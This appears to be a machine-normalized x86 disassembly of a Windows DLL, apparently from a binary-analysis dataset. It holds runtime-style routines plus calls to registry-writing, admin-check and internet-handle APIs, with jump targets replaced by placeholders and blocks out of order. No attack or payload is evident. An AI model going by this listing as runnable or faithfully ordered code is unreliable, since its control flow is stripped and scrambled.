lea ecx [ ebp - 0x50 ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_10069ce0
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] bl
call sub_10006560
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10028071
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10035d20
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1003f510
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_1004ff82
push edi
push ebx
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10035d20
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
cmp [ ebp - 0x38 ] 0x10
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
mov eax [ ebp - 0x54 ]
je r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000df21
add esp 0x10
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] edi
call sub_10041a20
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] ebx
jge r-xdata
or [ eax ] 0x1
cmp esi 0x1
ja r-xdata
mov ecx [ ebp - 0x68 ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x60 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_100160f6
push 0x34
mov eax sub_1007fc9e
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_1003088d
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_1003088d
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1003b4a0
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_1000a2b0
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_10067053
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10020b50
mov eax [ ebp - 0x30 ]
call sub_1004fa89
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10008430
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_100161cd
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1001624c
push 0x38
mov eax sub_1007f89a
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_100688a0
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1002b6c2
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10069ce0
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10058a63
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10016320
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] eax
call sub_1006fd10
xor esi esi
add esp 0x8
cmp [ edi + 0xc ] esi
jbe r-xdata
lea eax [ edi + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
call sub_10052120
lea edx [ ebp - 0x10 ]
push edi
push edx
call sub_10035fe0
add esp 0x10
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8 ]
mov ecx [ eax + esi * 4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_1006bd20
inc esi
add esp 0x8
cmp esi [ edi + 0xc ]
jb r-xdata
sub_10016380
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
sar eax 0x1
push edx
call sub_10015dc0
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
push eax
mov ecx esi
call sub_10036380
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_100163cb
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1002b48f
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10010183
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1003c7fc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_10016580
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20106
push 0x0
push 0x0
push 0x0
push eax
push edx
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ ebp + 0xc ]
push esi
push eax
push 0x0
push ecx
push edx
call [ RegSetValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x3
sub_10016600
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x14 ]
test eax eax
js r-xdata
push edi
push 0x30
push esi
call sub_10020380
mov edx [ esi + 0x4 ]
add edx 0x8
push edx
mov edi eax
push edi
push esi
call sub_100049a0
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
mov ecx [ esi + 0x4 ]
cmp [ ecx + 0xc ] eax
jb r-xdata
xor eax eax
pop esi
pop ebp
retn
sub_1001663f
push 0x4
mov eax sub_1007f35f
call sub_100097c8
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1001b110
push esi
push eax
push edi
call sub_1000710e
add esp 0x10
push 0x18
call sub_10055606
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10020734
push esi
push eax
push edi
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_10037f10
mov esi eax
jmp r-xdata
push [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1001e70b
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1005af08
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1000b333
mov eax [ ebp + 0xc ]
or [ edi + 0x10 ] eax
mov eax [ esi + 0x1c ]
add esp 0x30
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1000ee68
push esi
push eax
push edi
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push edi
call sub_1000710e
add esp 0xc
jmp r-xdata
push eax
lea ecx [ edi + 0x18 ]
call sub_10055040
mov eax edi
call sub_1004db01
retn
lea eax [ esi + 0x20 ]
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1001e573
push esi
push eax
push edi
call sub_1000710e
add esp 0x10
push 0x8
call sub_10055606
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push edi
call sub_1000710e
add esp 0xc
jmp r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1005434f
push esi
push eax
push edi
call sub_1000710e
add esp 0x10
push 0x18
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push edi
call sub_1000710e
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push edi
call sub_1000710e
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_1005ae38
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push edi
call sub_1000710e
add esp 0xc
jmp r-xdata
sub_100168b0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
mov esi eax
xor eax eax
sub ecx eax
push edi
je r-xdata
mov [ esp + 0xc ] eax
dec ecx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ edi ]
cmp esi [ edx ]
je r-xdata
mov [ esp + 0xc ] 0x1
jmp r-xdata
dec ecx
jne r-xdata
mov eax edx
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x3c ] bl
jne r-xdata
add edi 0x4
cmp edi ecx
jne r-xdata
mov edi [ edx + 0x3a0 ]
mov ecx [ edx + 0x3a4 ]
cmp edi ecx
je r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ edi ]
mov eax [ esi + 0x30 ]
mov edx [ eax + 0x4 ]
add esi 0x30
test [ edx + esi + 0xc ] bl
jne r-xdata
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
test [ edx + eax + 0x2c ] 0x1
je r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xc8 ] eax
mov eax [ edi ]
cmp [ eax + 0xc8 ] 0xffffffff
jne r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx + 0x4 ]
mov bl 0x6
test [ eax + edx + 0x2c ] bl
jne r-xdata
mov ecx [ edx + esi + 0x38 ]
mov edx [ esp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ecx ]
push 0x2
push edx
cdq
push edx
mov edx [ ebx + 0x28 ]
push eax
lea eax [ esp + 0x20 ]
push eax
call edx
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
lea ecx [ eax + edx + 0x20 ]
mov eax [ ecx + 0x38 ]
neg eax
sbb eax eax
and eax 0xfffffffc
add eax 0x4
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
mov ecx [ eax + edx + 0x58 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push edx
call eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
jmp r-xdata
cmp edx [ r--data ]
jne r-xdata
push 0x0
call sub_1003c700
mov eax [ edi ]
mov edx [ eax + 0x20 ]
mov ecx [ edx + 0x4 ]
test [ eax + ecx + 0x2c ] 0x6
jne r-xdata
mov eax [ esp + 0xc ]
mov ecx [ ecx + esi + 0x38 ]
mov ebx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x8 ]
cdq
push edx
push eax
mov eax [ ebx + 0x28 ]
lea edx [ esp + 0x20 ]
push edx
call eax
mov eax [ esp + 0x18 ]
cdq
add eax [ esp + 0x10 ]
adc edx [ esp + 0x14 ]
cmp eax [ r--data ]
jne r-xdata
mov edx [ edi ]
add eax ecx
mov [ edx + 0xcc ] eax
mov esi [ edi ]
mov eax [ esi + 0x20 ]
mov ecx [ eax + 0x4 ]
add esi 0x20
test [ ecx + esi + 0xc ] bl
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov [ esp + 0x1c ] ecx
add eax ecx
mov ecx [ eax + ecx + 0x58 ]
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
push 0x1
push 0x1
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
call edx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
add eax ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edx [ r--data ]
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + esi + 0xc ]
add ecx esi
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x0
call sub_1003c700
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
push 0x0
call sub_1003c700
sub_10016b30
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
cmp edx 0x7f
jg r-xdata
cmp edx 0x7ff
jg r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edx 0xffff
jg r-xdata
mov ebx 0x1
mov [ ebp - 0x4 ] 0xc0
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
lea eax [ eax + ebx + 0x1 ]
mov edi ecx
cmp edi eax
jae r-xdata
mov ebx 0x3
mov [ ebp - 0x4 ] 0xf0
mov ebx 0x2
mov [ ebp - 0x4 ] 0xe0
jmp r-xdata
cmp edi ecx
je r-xdata
add edi edi
cmp edi eax
jb r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebx + ebx * 2 ]
add ecx ecx
sar edx cl
mov ecx [ esi ]
or dl [ ebp - 0x4 ]
mov [ eax + ecx ] dl
inc [ esi + 0x4 ]
mov edi [ esi + 0x4 ]
lea eax [ ebx - 0x1 ]
test eax eax
js r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10020380
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edx
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_100796a0
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10035fe0
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add esp 0x1c
mov [ esi ] ecx
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ eax + eax * 2 ]
add ecx ecx
mov edx [ ebp + 0xc ]
mov ebx [ esi ]
sar edx cl
sub ecx 0x6
and dl 0x3f
or dl 0x80
mov [ edi + ebx ] dl
inc [ esi + 0x4 ]
dec eax
mov edi [ esi + 0x4 ]
jns r-xdata
sub_10016c16
push 0x28
mov eax sub_1007f6b0
call sub_100097c8
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10059c54
mov [ esi ] r--data
jmp r-xdata
sub_10016cd0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov [ esi ] 0x0
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
sub_10016d10
push ebp
mov ebp esp
push 0xffffffff
push sub_10080600
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_1000bd19
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_10023c20
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_10055606
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_1006591f
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_100796a0
add esp 0xc
sub_10016e4b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_1000bd19
int3
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
sub_10016e80
push ebp
mov ebp esp
sub esp 0x764
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x748 ] esi
mov [ ebp - 0x744 ] ebx
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x74c ]
mov eax 0x7
call sub_10044b40
lea edx [ ebp - 0x73c ]
mov eax 0x1
call sub_10044b40
lea edx [ ebp - 0x740 ]
mov eax 0x3
call sub_10044b40
mov eax edx
push eax
push edi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x210 ]
test eax eax
mov edx 0x104
mov eax ecx
je r-xdata
mov esi edi
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x73c ]
xor esi esi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test esi esi
je r-xdata
sub eax 0x2
mov esi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov edi [ ebp - 0x748 ]
lea eax [ ebp - 0x740 ]
push eax
push edi
call [ StrStrW@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x620 ]
test eax eax
mov edx 0x208
mov eax ecx
je r-xdata
